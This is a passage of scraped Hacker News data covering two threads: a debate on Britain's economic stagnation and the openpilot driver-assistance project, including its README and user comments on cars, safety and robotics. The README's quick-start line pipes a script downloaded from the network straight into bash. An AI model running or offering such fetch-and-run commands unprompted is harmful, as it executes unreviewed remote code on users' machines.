https://en.wikipedia.org/wiki/English_coffeehouses_in_the_17... reply emmet 8 hours agoparentprevI've been here for 5 years and am almost thirty years old. I still have people regularly asking me where I went to secondary school. They are obsessed with class. reply dukeyukey 6 hours agorootparentI've been here for 30 years, and am 30 years old, and I don't think anyone has ever asked me where I went to secondary school. What kind of people ask you that? reply emmet 6 hours agorootparentI somehow keep ending up working at places where 90% of the employees grew up with staff in the house. Dozens of people with wikipedia pages about their families. reply AnimalMuppet 5 hours agorootparentSo, people who grew up with staff in the house are obsessed with class. That's perhaps disappointing, but not really surprising. I'd bet, in the US, you'd find the same among people who grew up with staff in the house. The difference may be that, in the US, it's a lot harder to find people like that. reply thorin 5 hours agoparentprevTo a certain extent I agree, however the head of state is only token position (albeit well paid!). It's not very different in the US, the \"name\" - Kennedy, Clinton, Obama, Bush, etc takes you most of the way there... Trump too I guess! reply shortrounddev2 5 hours agoparentprevSometimes I'll read a biography of a famous British person and the first chapter is dedicated to the full family lineage of them. You won't even hear the subject's name until chapter 2 because it was more important to discuss what his grandfather did in India in 1895. I think biographies of Americans tend to start at the childhood of the subject and will mention their family life and parents when relevant reply hkon 8 hours agoparentprevThe same last names are mentioned in the context of many US elections. US is not as far removed as you might think. reply Dalewyn 8 hours agoparentprev>Passing off wealth and prestige by lineage has long been shown to be a bad idea. The next generation typically just screws it up. In Japan there's an old saying that the success of a family is determined with the third generation. The first builds the family empire. The second grows up seeing the first build it up and thus knows how to maintain it. The third grows up already having the empire and doesn't know how to maintain it, whether he can pass it on is essentially a dice roll. The fourth generation onwards, if the third succeeded, can refer to the family records and keep things going mostly indefinitely or realizes it's time to hand it off to different blood at that point. reply inglor_cz 8 hours agoparentprev\"People value you a lot more because of what you’ve done vs who you are and, with some exception, nobody cares who your parents were.\" Maybe on individual level, but as far as economy goes, mainland EU is still stuck with very old corporations and rarely generates some interesting startup (not just in IT). There has been a notable dearth of new European corporations since the 1970s at least. The old guard controls everything. And London is full of European youngsters who came there to study and do some business, because the possibilities are broader there, including some VC culture. Try founding a new company in Germany; you will be met by a merciless paper storm that can only be weathered with help of a professional specialized in dealing with bureaucracy, and may take several months to overcome. The UK is too complicated to fit into one neat box. It has its peers in medieval gowns, but at the same time, London is a very modern 21st century city, more modern than many metropolises on the continent. Perhaps Warsaw is more modern than London. reply t43562 8 hours agoprevThe way rail project costs are totalled up is different from one country to another -what costs are included and excluded. In other words this website is making enormous oversimplifications and not bothering to explain or justify them. reply dzonga 4 hours agoprevwhy was this flagged ? there is no poor energy rich country. with the U.K having expensive energy it means they're slowly becoming a poor country. it already feels poor as it is. But this will accelerate the rate reply dash2 5 hours agoprevI loved this paper, it's full of new ideas. My main question/challenge would be: if the problems have been constant since the 1950s-1980s - e.g. planning and failure to build - then how come we were doing so well until 2008? Why did problems only start biting then? reply aembleton 3 hours agoparentProbably a decline in North Sea oil revenue reply misja111 8 hours agoprevThe list of issues that the article list seems very ad hoc. Some are compared to EU countries, but apparently only where this makes the UK come out worst. It also ignores the fact that the UK might do better in some area's than other countries, it would be fair to lists these as well. Otherwise you could make a list like this for any country in the world. Also some issues seem irrelevant. E.g. the crime rate was given, and it was mentioned that this had been actually going down in the recent years. But then it was compared to the crime rate after WO2, and yes, compared to that it went up. reply card_zero 7 hours agoparent\"These are not just disconnected observations\", says the article. Yeah, but they might be actually. For instance the one about France producing more electricity is because France famously over-invested in nuclear power stations and that's why its electricity price recently went negative. Meanwhile the UK probably needs to increase supply slightly, but the comparison is misleading. reply dist-epoch 8 hours agoparentprevThe fact it's a whole site dedicated to this article means there's some angle to it. Would be interesting to know who paid for this. reply seanhunter 8 hours agorootparentOne of the authors is from the center for policy studies, which is a thinktank that was founded by Margaret Thatcher and 2 others. The other two authors seem to be the founder and one of the main contributors to https://worksinprogress.co/ which describes itself as \"a magazine of new and underrated ideas to improve the world.\" So I'm going to guess it's gonna be that sort of thing. Someone with a neoliberal economic perspective who stands to benefit from government investments in largescale infrastructure projects. reply Fernicia 7 hours agorootparentThis is one of the worst comments I've read on HackerNews and engenders the decline in critical thinking that has become so pervasive here in recent years. You find a bunch of ways to frame the authors as the out-group, then cast a totally baseless aspersion. Presumably so you don't have to engage with any of the actual points in the article. reply seanhunter 5 hours agorootparentI'm not framing them in terms of an out group at all. It's the exact opposite- they are the most \"in\" of in-groups. In the UK, government policy for the last 15 years has been hugely influenced by this specific thinktank and two or three similar ones. It's an extraordinarily small group. If Britain is in decline due to lack of infrastructure investment it's in no small part because of the policy positions that they have advocated and implemented during that time. I care a great deal about the actual points in the article. It's just important to understand this is not in any sense a neutral analysis. reply archagon 4 hours agorootparentprevIf this is one of the worst comments you’ve read on HN, you must be new to the site. reply geye1234 6 hours agorootparentprevhttps://en.wikipedia.org/wiki/Bulverism reply socksy 7 hours agorootparentprevThis section really shows where they're coming from: Privatisation, tax cuts, and the curbing of union power fixed important swathes of the UK economy. Crucially, they tackled chronic underinvestment in sectors that had been neglected under state ownership. Political incentives under state ownership encouraged underfunding – and where the Treasury did put money in, it tended to go on operational expenditures (e.g., unionised workers’ wages rather than capital investments). This problem has immediately reemerged as the Department for Transport has begun to nationalise various franchises (which it promises to do to all of them). It is bizarre to me that they can claim that under government ownership the incentives were towards underfunding, implying that somehow the incentives are any different under private ownership (although admittedly, there's been great investment in ticket barriers...) reply dukeyukey 6 hours agorootparentprev> who stands to benefit from government investments in largescale infrastructure projects I'm unsure if there's anyone in the country who wouldn't benefit from that. Hell, you can even wipe \"government away\", the essay talks at length about re-enabling private infrastructure investment too. And who doesn't like infrastructure investment? reply seanhunter 5 hours agorootparentI would say most people benefit from working infrastructure. What we have seen in the last decade or so is a lot of government spending on infrastructure analysis (eg the \"levelling up\" agenda which brought spending mostly in London - the exact opposite of the stated intent or HS2 which has seen 15bn of spend mostly on slideware and consultants) without much in the way of actual infrastructure being developed. There is unquestionably a large swathe of the UK (in particular the North, North East and most of Wales) which would benefit tremendously from improved infrastructure. reply barry-cotter 7 hours agorootparentprevWhat an ugly, impoverished view of the world. Someone sees that the UK is poorer than it would be if economic policy wasn’t a disaster and wants to publicise that so it can be improved and tens of millions of people’s lives improved and you’re looking for an “angle”. Poverty is bad. There’s the angle. reply rjsw 4 hours agorootparentTufton Street thinktanks [1] are not trying to reduce poverty. [1] https://en.wikipedia.org/wiki/55_Tufton_Street reply littlestymaar 5 hours agoprevThis graphic[1] show how insane the European electricity market regulation has been for both France and the UK: going from electricity prices on par with the US to 2-3 times the price in less than a decade ! [1]: https://datawrapper.dwcdn.net/7SNeG/full.png reply lispm 4 hours agoparentIf you only look at the price, then you don't get the full picture. reply lvoudour 7 hours agoprevOn a tangent, what is astonishing to me as an outsider is the cultural stagnation. Even in times of economic decline Britain was a cultural powerhouse. Modern music, theater, cinema, tv, literature, sports, etc. were permanently shaped by post-war Britain (especially in Europe). Whatever the cultural norm dictated by the behemoth that is the USA, Britain always had something new, something fresh to give. There's no point listing specific examples, they are numerous. What happened in the last 15 years is a mystery to me. I doubt it's economic stagnation (been there before) and I doubt it collapsed under the weight of US culture (which is still enamored with anything British). Maybe the modern internet and social media diluted everything. I don't know, but I miss it. (sorry for the off-topic) reply pjc50 5 hours agoparentWhenever you ask someone in the creative industries, they point to the aggressive tightening of the benefits system. People could write music and books while on the dole in the 80s, and become commercial successes. Now it's an area that's only accessible to people who can afford to have their parents \"loss leader\" their first few years in the industry, and as a result has lost all \"realness\". reply wrp 6 hours agoparentprevI don't think it's entirely off-topic, though I only have a vague sense of the connection. I knew 1980s Japan, a society of supreme confidence, and contrast it with modern Japan, a society that has really lost its mojo. What I think happened is that the depression of the 1990s so thoroughly shook their confidence that they still haven't recovered. I've only observed English culture from abroad, but my sense since the late 1990s is that the English have become somehow ashamed to be openly proud of their culture. I don't have a feeling for what brought this about. reply card_zero 5 hours agoparentprev> There's no point listing specific examples, they are numerous. Four of them, if you include Ringo. reply dxbydt 3 hours agorootparentmust commend this briton for his unparalleled sense of humor, razor-sharp wit, subtle, effortlessly charming and perfectly timed quips. While American humor tends to be more direct and sometimes louder, this dry, understated delivery is a unique gift. reply roenxi 7 hours agoparentprevI'd expect the cultural stagnation to lead the economic. The article is clearly political but it is pointing out some really obvious long term trends. The fact that the UK elite haven't been able to grapple with them at any point in the last few decades showcases that, as a culture, they've lost the spark of competence. The UK media and upper class have failed to identify energy, housing or infrastructure more generally as requiring serious responses too. Their entire system appears to be off the rails. Their failure relative to countries like China really is quite astonishing, although it doesn't set them far apart from the greater western bloc. It makes sense that we aren't seeing cultural leadership out of them; where would they lead us too? Nowhere good. reply mellosouls 6 hours agoparentprevI'm not sure 15 years is enough to look back. I'm struggling to think of a time since the 80s that some formerly strong areas of British culture were vibrant and interesting. See eg. BritPop, a vacuous derivate outpouring of jumped-up pub rock relying on waving the flag to justify it's existence. Some areas have still produced decent stuff, eg comedy (The Office, Borat, Peep Show), etc. Our twists on black American music (eg grime, drill) seem ok. But it's a real struggle to think of much that is vital and original as a culture from Britain in the last 30 years I'd say. reply wrp 6 hours agorootparentWell, British TV in the 1990s was great. reply logicchains 4 hours agoprevThe reason that Britain has stagnated is the same reason most of western Europe has stagnated (in that GDP per capita hasn't increased for around a decade): continuously increasing debt and an aging population. It's a classic empirical economic result that a high enough level of government debt leads to reduced growth rates, and it's also well-known that growth rates decrease as the average age of the population increases. Over the past couple decades the UK population has been getting older and older on average and the national debt has been getting higher and higher. reply benfortuna 7 hours agoprev\"But it remains doubtful that [Labour] will be any better at delivering on those ambitions than the Conservatives were.\" This one sentence in the introduction belies an article not entirely based on factual evidence. reply barry-cotter 6 hours agoparentIf only there was some factual evidence to point to to suggest were wrong and Labour might do better than the Tories. reply marxisttemp 4 hours agoprevRightoid propaganda reply trabant00 8 hours agoprevType of article: country X or company Y or city Z has it bad for such and such decisions, policies, culture. My rule of thumb for these kind of articles: if they don't mention external factors they are not worth reading. An entity's situation is influenced by much m",
    "originSummary": [
      "Britain's economy has stagnated due to restrictions on investment in housing, transport, and energy, with real wage growth stagnant for 16 years.",
      "High infrastructure costs, restrictive housing policies, and expensive energy have contributed to the economic slowdown.",
      "Solutions include removing barriers to private investment, streamlining planning processes, and adopting successful international models, such as South Korea’s approach to nuclear power."
    ],
    "commentSummary": [
      "The article attributes Britain's economic stagnation to historical government policies, including post-WWII state investment and 1980s Conservative privatization.",
      "Critics argue that privatization has led to long-term decline, using examples like the poor performance of water companies.",
      "The discussion also highlights the influence of right-wing think tanks and compares Britain's economic context with other countries, emphasizing restrictive planning systems and insufficient infrastructure investment as key factors."
    ],
    "points": 138,
    "commentCount": 262,
    "retryCount": 0,
    "time": 1726826356
  },
  {
    "id": 41600177,
    "title": "Openpilot – Operating system for robotics",
    "originLink": "https://github.com/commaai/openpilot",
    "originBody": "openpilot openpilot is an operating system for robotics. Currently, it upgrades the driver assistance system in 275+ supported cars. Docs · Roadmap · Contribute · Community · Try it on a comma 3X Quick start: bash <(curl -fsSL openpilot.comma.ai)To start using openpilot in a car To use openpilot in a car, you need four things: Supported Device: a comma 3/3X, available at comma.ai/shop. Software: The setup procedure for the comma 3/3X allows users to enter a URL for custom software. Use the URL openpilot.comma.ai to install the release version. Supported Car: Ensure that you have one of the 275+ supported cars. Car Harness: You will also need a car harness to connect your comma 3/3X to your car. We have detailed instructions for how to install the harness and device in a car. Note that it's possible to run openpilot on other hardware, although it's not plug-and-play. To start developing openpilot openpilot is developed by comma and by users like you. We welcome both pull requests and issues on GitHub. Join the community Discord Check out the contributing docs Check out the openpilot tools Read about the development workflow Code documentation lives at https://docs.comma.ai Information about running openpilot lives on the community wiki Want to get paid to work on openpilot? comma is hiring and offers lots of bounties for external contributors. Safety and Testing openpilot observes ISO26262 guidelines, see SAFETY.md for more details. openpilot has software-in-the-loop tests that run on every commit. The code enforcing the safety model lives in panda and is written in C, see code rigor for more details. panda has software-in-the-loop safety tests. Internally, we have a hardware-in-the-loop Jenkins test suite that builds and unit tests the various processes. panda has additional hardware-in-the-loop tests. We run the latest openpilot in a testing closet containing 10 comma devices continuously replaying routes. Licensing openpilot is released under the MIT license. Some parts of the software are released under other licenses as specified. Any user of this software shall indemnify and hold harmless Comma.ai, Inc. and its directors, officers, employees, agents, stockholders, affiliates, subcontractors and customers from and against all allegations, claims, actions, suits, demands, damages, liabilities, obligations, losses, settlements, judgments, costs and expenses (including without limitation attorneys’ fees and costs) which arise out of, relate to or result from any use of this software by user. THIS IS ALPHA QUALITY SOFTWARE FOR RESEARCH PURPOSES ONLY. THIS IS NOT A PRODUCT. YOU ARE RESPONSIBLE FOR COMPLYING WITH LOCAL LAWS AND REGULATIONS. NO WARRANTY EXPRESSED OR IMPLIED. User Data and comma Account By default, openpilot uploads the driving data to our servers. You can also access your data through comma connect. We use your data to train better models and improve openpilot for everyone. openpilot is open source software: the user is free to disable data collection if they wish to do so. openpilot logs the road-facing cameras, CAN, GPS, IMU, magnetometer, thermal sensors, crashes, and operating system logs. The driver-facing camera is only logged if you explicitly opt-in in settings. The microphone is not recorded. By using openpilot, you agree to our Privacy Policy. You understand that use of this software or its related services will generate certain types of user data, which may be logged and stored at the sole discretion of comma. By accepting this agreement, you grant an irrevocable, perpetual, worldwide right to comma for the use of this data.",
    "commentLink": "https://news.ycombinator.com/item?id=41600177",
    "commentBody": "Openpilot – Operating system for robotics (github.com/commaai)137 points by punnerud 9 hours agohidepastfavorite98 comments jmacd 5 hours agoI have a Dodge Ram. Last night I had a 400km drive to do after a very long day. I wasn't exhausted, but I certainly felt like I did not want to drive an extended period of time. I have a Comma 3x in the truck and felt way more confident, alert and comfortable for the entire drive. OpenPilot/Sunnypilot/Frogpilot are not FSD, but they are hands off driving assistance. The 2020 Ram performs incredibly well. The latest driving models are very smooth as well, no ping-ponging and they handle passing and traffic extremely well. A legacy car maker would be smart to acquire Comma if its for sale. They would be extremely close to a viable assisted driving capability with it. reply pj_mukh 3 hours agoparentMind boggling to me that a non-ping pongy lane keeping is not standard in cars. Is it standard in luxury cars? Seems like an obvious thing to add/upsell. reply residentraspber 50 minutes agorootparentMy 2019 Audi S5 was excellent at this. It would ping pong at most once then auto-correct itself to be perfectly centered in the lane. It did some weird things like if the car in front of you was driving a bit too far to the left/right of a lane, it would copy them. Other than that it was nearly perfect, though. Never had it take an exit by accident, etc. Their tuning on when to accelerate/brake and make it smooth needed a fair bit of work, but I found that switching the drive mode from Dynamic (Sport) to Comfort changed the eagerness of the system and smoothed things out. reply hasperdi 2 hours agorootparentprevNon ping-ponging lane following assist is already available in many cars including KIA and Hyundai models. They're very conservative and disengage very easily. I think it's by design to minimise their legal accountability reply kube-system 1 hour agorootparentNot just legal accountability, but actual safety. They are designed so that they do not give the user a false impression of the extent of their capabilities. reply judge2020 2 hours agorootparentprevAlso Honda. In my Accord 2018 it lane kept but didn’t even play a sound when it lost tracking. reply sfblah 37 minutes agoprevThere's an element of using these systems that people don't usually discuss. One of the forks, Sunnypilot, enables a mode where you control the pedals but don't have to do the steering. What I've found is you do pay attention in this mode, and since you're controlling the brakes you can easily avoid most issues that you would get with self driving. But, not having to have your hands on the steering wheel makes the experience a lot more pleasant. Also, with traditional lane keeping systems, the so-called \"longitudinal\" control (accelerator and brakes) is where in my experience the system makes the most mistakes. I think this mode is something car manufacturers should enable in general. I actually suspect it's significantly safer than completely hands- and feet-free driving modes, and you get most of the benefit of lane-keeping assist. reply bilsbie 7 hours agoprevI can’t wrap my head around the fact that 275 car models include all the actuators needed for self driving driving and there’s some kind of port third party software can hook into. reply kube-system 5 hours agoparentLevel 2 driving assistance is commonplace on many new vehicles, often as a standard feature. They are just significantly more conservative in their functionality compared to the level 2 offerings from Tesla, and marketed as safety features rather than \"self driving\" features. It's important to note that nothing we're talking about here is actually \"self driving\" per SAE standards. Openpilot, Tesla's Autopilot/FSD, Honda Sensing, Toyota Safety Sense, Hyundai SmartSense, etc are all level 2 driving assistance features. This turns level 2 driver assistance features into ... nicer level 2 driver assistance features. reply mavhc 4 hours agorootparentReally need some decimal points in the SAE list. Fully self driving but a human has to watch, and lane keeping are both level 2 reply kube-system 1 hour agorootparent\"Fully self driving but a human has to watch\" is nonsensical. Responsibility for observing the road and making decisions is a very important and inseparable part of driving. Mechanistically manipulating the steering, brakes, and accelerator is not the hard part. https://www.sae.org/blog/sae-j3016-update Vehicles with levels 0-2 of driver support are never self-driving at any moment of operation. These systems might be able to manipulate the controls of the vehicle, but they are not good enough to make decisions without constant supervision at all times. Level 3 is partial self-driving, where the vehicle can assume responsibility for driving under some narrow circumstances. Full self driving doesn't happen until level 4. I think the reason that there's no decimal points is because J3016 is really a road-map of the milestones on the way to full automation, not a buyers guide. reply edude03 1 hour agorootparentprevI’ve been saying this since Tesla released autopilot because I personally think teslas implementation is the best but there isn’t an easy way to compare it to something like radar cruise with lane keeping other than saying they’re both level 2. reply flessner 7 hours agoparentprevI don't know if there's a physical port in most cars, but it uses the CAN bus which has been around since the 1980s. Also, most cars that have distance assist and lane keeping probably have the required hardware to control speed and steering to some extent. Nevertheless, it's still impressive that so many cars are supported... and that it can be retrofitted like this at all! reply fkyoureadthedoc 6 hours agorootparentThey also lie about models that are supported and won't assist you when you run into that. Had to return one myself. Found no evidence anywhere that my model/year was ever actually supported and anyone was using it either. reply BitsAndBlobs 5 hours agorootparentThere's a very active community on Discord that would have been happy to help you add support for your car assuming it has the right hardware. https://comma.ai/vehicles has also been improved quite a bit in the past year. reply jmacd 5 hours agorootparentprevSounds like they refunded you? reply fkyoureadthedoc 4 hours agorootparentYeah, that process at least was painless reply olabyne 5 hours agorootparentprevCould you say what car ? reply fkyoureadthedoc 4 hours agorootparent2023 Forte https://www.reddit.com/r/Comma_ai/comments/197k04q/2023_kia_... https://github.com/commaai/openpilot/issues/30936 You can find a few attempts of people trying to get it to work in their discord with no clear positive outcome, discord is unfortunately not search indexed. reply Teknomancer 7 minutes agorootparent> discord is unfortunately not search indexed. Using discord, etc for any open source project discussions is really unproductive. Get it that people like the immediacy of chat style communication. But it seems to encourage way more noise and less thoughtful dialogue. The worst aspect is that it locks away a lot of useful information. Trying to dig through chat histories for information is a horrible experience. reply BitsAndBlobs 4 hours agorootparentprevIt looks like support was added in February https://github.com/commaai/openpilot/pull/30761 reply fkyoureadthedoc 4 hours agorootparentYeah it was on the supported list when I bought it in October of 2023. The website asks your make/model/year when you buy if I recall correctly, that's how it tells you which harness to get. I found out I needed to update some files in the firmware, followed the guide for that. Asked for help in the Discord. I could never get it working though and returned it after a week. I was going to hang on to it and harass people on Discord, but didn't want to lose track of time and go beyond the return window. Believe me, I really wanted it to work. Looks like it was added to the supported list before the explicit support I guess https://github.com/commaai/openpilot/commit/e3275e918354945d... reply michaelmior 3 hours agorootparentprevI beleive in the US OBDII ports are required in all vehicles 1996 and later. reply bdavbdav 7 hours agoparentprevI suspect it may be even more than that theoretically. A lot of VAG cars based on the same platform are missing. reply bks 7 hours agoprevI chose the Hyundai Ioniq 5 as my current car specifically because it’s compatible with OpenPilot. It’s been a total game-changer for my driving experience. Just like their tagline says, “make driving chill,” and for me, it truly delivers on that promise. reply sofixa 6 hours agoparentThis reminds me of Waymo's approach to self-driving cars. Paraphrasing, but basically they found that progressively adding self-driving to help human drivers is bad, because it leads to the humans becoming complacent and not paying enough attention. Therefore they decided on an all or nothing approach, where their cars would be only and entirely self-driven. reply typewithrhythm 5 hours agorootparentThis always seemed like a bit of bull from waymo. It's not an easy problem to work with existing manufacturers to give a better and or cheaper solution... Especially when there are established competitors with efficient verification and validation processes (that every manufacturer requires). They decided it wasn't worth explaining that their techniques don't generalise to a driver assist. It would not be good or cheap enough to be worth developing the compliance and integration frameworks. reply jowday 5 hours agorootparentThe first thing Waymo tried building (way back when, circa 2010 or so) was highway based driver assist in the style of Autopilot. They did a ton of testing with it and didn’t like how quickly their testers stopped paying attention despite a ton of instruction not to. I’ve seen clips from these tests. It’s also possible they shifted direction because the long term vision of robotaxis is much more lucrative. reply warble 4 hours agorootparentMaybe I'm being ignorant about something here but isn't paying less attention the whole point? reply Veserv 56 minutes agorootparentYou can already do that by just closing your eyes and letting Jesus take the wheel. No, the point is doing so while maintaining safety. It is materially less safe to operate a ADAS while distracted than driving manually. Humans are exceptionally good drivers on average, only encountering minor crashes on timeframes measured in years to decades. As such, if safety critical ADAS errors occur more frequently than every ~100,000 miles and you are attentive in less than 100% of all such occurrences, you are operating your vehicle multiple times more dangerously than the average driver (which is a number that includes drunks and distracted drivers). That is why it is critical to deliberately downplay the capabilities, to avoid wishful over-reliance, and enforce strict driver awareness (through techniques such as driver monitoring) to avoid operating multi-ton killing machines in ways that are multiple times more dangerous to the occupants, other drivers, and pedestrians. Without that, people are prone to over-generalization of safety capabilities, extrapolating that a single success means robust, continued success thousands to tens of thousands of times in a row. reply mook 3 hours agorootparentprevIsn't the point to pay _no_ attention? The difference is when an accident occurs, was the person in the car at fault for not vigilantly watching everything. reply sofixa 3 hours agorootparentprevUnless you assume that self-driving software is perfect, no, it really isn't. That's the whole problem - the drivers would get complacent, so when there's an issue, they'd be caught by surprise and wouldn't be able to react. reply zrt1019 7 hours agoparentprevI'm confused: \"THIS IS ALPHA QUALITY SOFTWARE FOR RESEARCH PURPOSES ONLY. THIS IS NOT A PRODUCT. YOU ARE RESPONSIBLE FOR COMPLYING WITH LOCAL LAWS AND REGULATIONS. NO WARRANTY EXPRESSED OR IMPLIED.\" Where can this be used? In a private parking lot? reply rogerrogerr 7 hours agorootparentThe driver takes liability, of course, and this can be used wherever the driver deems it safe and useful. reply diggan 6 hours agorootparent> this can be used wherever the driver deems it safe and useful With the disclaimer that this depends on the location of course. For example, I think in Spain (and probably EU wide?) modifications that affect steering and throttle control would need to undergo local homologation before you're legally allowed to drive with that on public roads at all. Which, to be honest, makes a lot of sense. I don't think anyone would be happy if cars start using software MVPs automatically controlling throttle and steering while in real traffic. reply edude03 1 hour agorootparentI mean let’s be frank here. The sort of people who are enthusiastic about this also aren’t going to be stopped by the law especially with the low risk of getting caught. reply diggan 35 minutes agorootparentIf I were to personally install this and use it anyways, my biggest worry would be the additional punishment if I cause an accident. Not sure exactly what the punishment is for driving a vehicle you know isn't road worthy, but I bet it aint pretty. reply moffkalast 1 hour agorootparentprevAka, this will drive your car into a ditch and it will be your fault. reply rogerrogerr 1 hour agorootparentIt really bothers me when people make statements like this. I propose a bet: If you’re so confident this will drive my car into a ditch, then front the money for me to buy a compatible car & this kit. If it drives my car into a ditch, I’ll pay you back double that money. That’s an easy bet for you, right? reply moffkalast 25 minutes agorootparentIf a piece of software that has the capacity to kill people is provided without any kind of assurances or warranty with the sole responsibility placed solely on the user, then that already tells me all I need to know, no bet needed to settle it. Would you buy an angle grinder that's specifically been designed to not have a guard so it can be more useful, made by random contributors on the internet without any official certification? I'll stick with the ones that needed to pass the CE mark and you can sue the company responsible if it chops your arm off thank you very much. They at least have a required level of anxiety needed to patch anything serious knowing the level of responsibility they carry and what's coming if they mess up. reply SkyPuncher 6 hours agorootparentprevThey’re just trying to scare away people who thing they can chuck this on their car and suddenly have a self-driving robot that they don’t have to pay attention to. reply torlok 5 hours agorootparentprevYou pay a thousand bones for a device you have to babysit. What's confusing about that? reply thatgerhard 7 hours agoparentprevIs it like an app you install on the car or is it a custom integration? reply rvnx 7 hours agorootparentIt's a dashcam that you put on the windshield with 2 cameras pointing forward and one inward (filming the driver). reply ozzyphantom 7 hours agorootparentIt’s my understanding that in addition to the cameras it also uses the sensors already built in to the car which would include blind-spot detection, no? reply diggan 6 hours agorootparentIt says my car is supported and my car doesn't have any blind-spot detection, nor does the requirements list that as needed, so maybe it's optional but not required? reply falcor84 7 hours agorootparentprevWhat is filming the driver used for? Can you disable that? reply world2vec 6 hours agorootparentTo ensure the driver has eyes on the road all time. It detects if you're not paying attention and beeps at you. I don't think it can be disabled. reply falcor84 5 hours agorootparentAh, thanks, I just found more detail here - https://github.com/commaai/openpilot/blob/master/docs%2FSAFE... They say it's required for ISO compliance with Level 2 autonomous driving reply colesantiago 7 hours agoprevI am not surprised that comma is still around. Minimal VC funding, less than 100 employees, not outrageously increasing headcount each month, profitable and sells a product with good margins. Not many startups do this anymore, they are just chasing funding every 3 months using OpenAI’s API, comma has their own models before the AI hype. reply solarkraft 5 hours agoparentIt’s cool to see that it’s possible to innovate sustainably, in a niche. So refreshing to see something stick around rather than become a bubble with a billion dollar valuation that either takes over the world and enshittifies or implodes and takes the product with it. Make business chill. That said: The larger they get, the more regulator attention they’ll attract. If some government entity wanted to, they could probably easily kill them. reply mdaniel 2 hours agorootparentkill the company, probably, but the source is MIT and there doesn't appear to be any copyright assignment, so no rug pull https://github.com/commaai/openpilot/blob/v0.9.7/LICENSE https://github.com/commaai/panda/blob/32eecd721129b9215030c5... reply edude03 1 hour agorootparentIIRC the actual model is private and only downloads once you activate the device so presumably if the company was shutdown you couldn’t use the device anymore unless someone shelled out for training reply mdaniel 1 hour agorootparentMakes sense. Given what I have seen of geohot's personality, I would bet dollars to donuts that he'd post a link to it in such an outcome reply siliconc0w 3 hours agoprevBeen following Openpilot for awhile, would totally use it if I had a supported car. Though these days most cars come with 'pretty good' ADAS, even 'hands free' in some situations, so I wonder how much it's \"worth it\" to DIY compared to factory default. reply drivingmenuts 7 hours agoprevIf I was in law enforcement, I’d be rubbing my hands in glee to get ahold of that saved video. reply xipix 3 hours agoparentI'd be even more gleeful if I was in car insurance. \"Openpilot's not covered, your insurance is invalidated.\" reply AyyEye 2 hours agorootparentInsurance is a non-issue with openpilot. reply ModernMech 4 hours agoprevI wonder why the website doesn't say \"operating system\" but instead calls it an \"advanced driver assistance system\" reply torlok 5 hours agoprevI always wondered who would pay $1000 for a device you have to babysit, just so that you can become an unpaid beta tester and data drone for SV millionaires. I guess all you have to do is tell people they're a part of a revolution? reply FullGarden_S 6 hours agoprevfor a second, I though this was the ROS alternative I've been forever waiting for smh reply rsp1984 7 hours agoprevWithout taking away anything from the substance or achievement of this release, I find phrases like \"openpilot is an operating system for robotics.\" always quite fishy. No, it's not an OS for robotics. You can't do actual robotics stuff with it, like drive actuators to control limbs or grippers, do motion control or SLAM or perception or any of the usual robotics stack. Their website correctly says openpilot is an open source advanced driver assistance system that works on 275+ car models of Toyota, Hyundai, Honda, and many other brands. Should've stuck to that. Thinking about it some more, it's probably just another engagement baiting strategy to get attention and I'm their gullible puppet. Well played. reply modeless 2 hours agoparentGeorge Hotz says: \"we developed a proper successor to ROS. openpilot has serialization (with capnp) and IPC (with zmq + a custom zero copy msgq). It uses a constellation of processes to coordinate to drive a car.\"[1] And Comma sells a robot that runs Openpilot: https://comma.ai/shop/body > You can't do actual robotics stuff with it, like drive actuators to control limbs or grippers, do motion control or SLAM or perception or any of the usual robotics stack. A lot of the \"usual robotics stack\" is not going to be relevant for the new wave of consumer robotics that is coming soon. It will be enabled by end-to-end machine learning and stuff like traditional SLAM methods will not be a part of that. The Bitter Lesson[2] is coming for robotics. [1] https://x.com/__tinygrad__/status/1834792473081815259 [2] For those unfamiliar: http://www.incompleteideas.net/IncIdeas/BitterLesson.html reply rsp1984 12 minutes agorootparentWith due respect, this has to be one of the most ignorant takes on robotics I have read in a while. Yes, you can always slap serialization and ZMQ on your framework. That doesn't make it an OS. And no, the usual robotics stack is not going away anytime soon. Maybe develop some actual useful robots before posting like an expert on robotics topics. reply GabeIsko 1 hour agorootparentprevIn the robotics community, the stuff coming out of George Hotz has always been considered a kludgy mess, and unsuitable for serious work. Dude is a talented hacker, but the idea that this will replace ROS is kind of a joke. reply tamimio 1 hour agorootparentTo be fair, even ROS I would consider a hobby one. reply ModernMech 1 hour agorootparentprevI enjoy Hotz as a hacker, but I'm really allergic to this kind of oversold language. \"[W]e developed a proper successor to ROS\" is a past tense statement, as if they've already done this thing. In reality, at best they have presented a roadmap for a thing that could approximate ROS one day. reply moffkalast 38 minutes agorootparentprevThe point of the bitter lesson is \"leverage compute as best you can\" not \"use DNNs everywhere just because\". Oftentimes your available compute is still a crappy ARM machine with no real parallel compute where the best DNN you can run is still not large nor fast enough to even be viable, much less a good fit. And well some classical algorithms like A* are mathematically optimal. You literally cannot train a more efficient DNN if your problem needs grid search. It will just waste more compute for the same result. Besides, the nav stack is not really the point of ROS. It's the standardization. Standard IPC, types, messages, package building, deployment, etc. Interoperability where you can grab literally any sensor or actuator known to man and a driver will already exist and output/require the data in the exact format you need/have, standard visualizers and controllers to plug into the mix and debug. This is something we'll need as long as new hardware keeps getting built even if the rest of your process is end to end. It doesn't have to be the best, it just needs to work and it needs to be widely used for the concept to make sense. reply modeless 30 minutes agorootparentThe future of consumer robotics will not be built on \"a crappy ARM machine with no real parallel compute\". Traditional robotics has failed to produce machines that can operate in the real world outside of strictly controlled environments, and more of the same isn't going to change that. Fast hardware for running DNNs will be a hard requirement for useful general purpose robots. reply conradev 4 hours agoparentprevI believe the idea is that openpilot replaces the usual robotics stack with an end to end neural net. While I agree operating system is usually a marketing term, it does feel correct in this case as it is the operating system for the Comma Three, which can operate cars but also this thing: https://www.comma.ai/shop/body reply metal_am 6 hours agoparentprevI definitely thought it was a ROS clone based on that first line. reply notum 6 hours agorootparentROS doesn't need a clone, it needs a successor. Took the bait as well. reply spookie 3 hours agorootparentROS2? I'll see myself out... reply failbuffer 2 hours agorootparentCould someone explain the joke? I've been dabbling with learning robotics and I've been confused by how ROS and ROS2 both appear to be actively developed/used. Is ROS2 a slow-moving successor version (like Python 3 was) or a complete fork? reply causal 2 hours agorootparentSlow-moving successor, which the community isn't exactly going wild over. It offers modest improvements in exchange for a painful upgrade process, and many of the original issues with ROS1 remaining unsolved. The other half of the joke is that ROS was never an operating system either. reply moffkalast 2 hours agorootparentWell there is one thing that ROS 2 does better, you can declare params directly inside nodes and reconfigure them all without building extra config files. And it doesn't stop working if your local IP changes. But the rest are firmly 